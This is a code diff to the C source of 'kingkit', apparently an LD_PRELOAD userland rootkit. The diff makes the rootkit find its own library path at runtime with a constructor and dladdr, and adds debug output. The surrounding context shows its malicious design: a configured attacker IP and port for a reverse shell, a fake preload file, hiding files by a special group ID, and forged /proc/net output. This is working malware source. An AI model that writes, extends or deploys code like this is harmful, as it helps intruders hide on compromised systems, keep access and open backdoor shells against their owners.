@@ -28,7 +28,6 @@
 //change these
 #define KING_NAME "Arnout" //put your nickname here
 #define HIDE_PREFIX "kingkit"
-#define LIB_PATH "/lib/kingkit.so"
 #define FAKE_PRELOAD "/etc/kingkit.so.preload"
 #define HOST "127.0.0.1" //attackers IP for reverse shell
 #define PORT 4444 //listening port for reverse shell
@@ -45,6 +44,10 @@
 
 
 
+//global variables
+static char *libpath = NULL;
+
+
 //function declarations
 void *syscall_address(void *, const char *);
 char *fd_to_path(int);
@@ -56,6 +59,7 @@ int is_hidden(char *);
 int is_protected(char *);
 int forge_procnet(char *pathname);
 int cmp_files(char *, char *);
+void resolve_libpath();
 
 
 //hooks declarations
@@ -301,16 +305,17 @@ int is_hidden(char *pathname) {
     printf("[kingkit] is_hidden() called with pathname: %s.\n", pathname);
     #endif
     original_open = syscall_address(original_open, "open");
+    if (libpath == NULL) resolve_libpath(); //sometimes is_hidden() is called before constructor functions
     int fd = (*original_open)(pathname, O_RDONLY);
     struct stat sb;
     if (fstat(fd, &sb) == -1) {
         close(fd);
-        return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0;
+        return strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, libpath) == 0;
     }
     close(fd);
     char own_proc_pid[14]; //pid maximum value can be up to 2^22 on 64-bit systems
     int len = snprintf(own_proc_pid, sizeof(own_proc_pid), "/proc/%d", getpid()); //since the /proc/self resolves to /proc/<pid> we need to check against that
-    return (sb.st_gid == HIDDEN_GID && strncmp(pathname, own_proc_pid, len) != 0 /*ensure that a hidden proces can access /proc/self*/ ) || strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, LIB_PATH) == 0; //return 1 if there is a match
+    return (sb.st_gid == HIDDEN_GID && strncmp(pathname, own_proc_pid, len) != 0 /*ensure that a hidden proces can access /proc/self*/ ) || strcmp(pathname, FAKE_PRELOAD) == 0 || strcmp(pathname, libpath) == 0; //return 1 if there is a match
 }
 
 
@@ -363,6 +368,9 @@ int forge_procnet(char *pathname) {
 
 
 int cmp_files(char *file1, char *file2) {
+    #if DEBUG
+    printf("[kingkit] cmp_files() called with file1: %s and file2: %s.\n", file1, file2);
+    #endif
     FILE *f1 = fopen(file1, "r");
     if (f1 == NULL) {
         return 1;
@@ -384,6 +392,28 @@ int cmp_files(char *file1, char *file2) {
     fclose(f1);
     fclose(f2);
     return ret;
+}
+
+
+void __attribute__((constructor)) resolve_libpath() {
+    #if DEBUG
+    printf("[kingkit] resolve_libpath() called.\n");
+    #endif
+    if (libpath != NULL) return; //constructor seem to be called more than once, so check if libpath is uninitialized
+    Dl_info so_information;
+    if (dladdr(resolve_libpath, &so_information) == 0) {
+        //we have to ensure that the program doesn't crash, so we set a dummy value for libpath
+        libpath = malloc(4);
+        if (libpath == NULL) return;
+        strcpy(libpath, "foo");
+        return;
+    }
+    libpath = realpath(so_information.dli_fname, NULL);
+    if (libpath == NULL) {
+        libpath = malloc(strlen(so_information.dli_fname)+1);
+        if (libpath == NULL) return;
+        strcpy(libpath, so_information.dli_fname);
+    }
 }
 
 
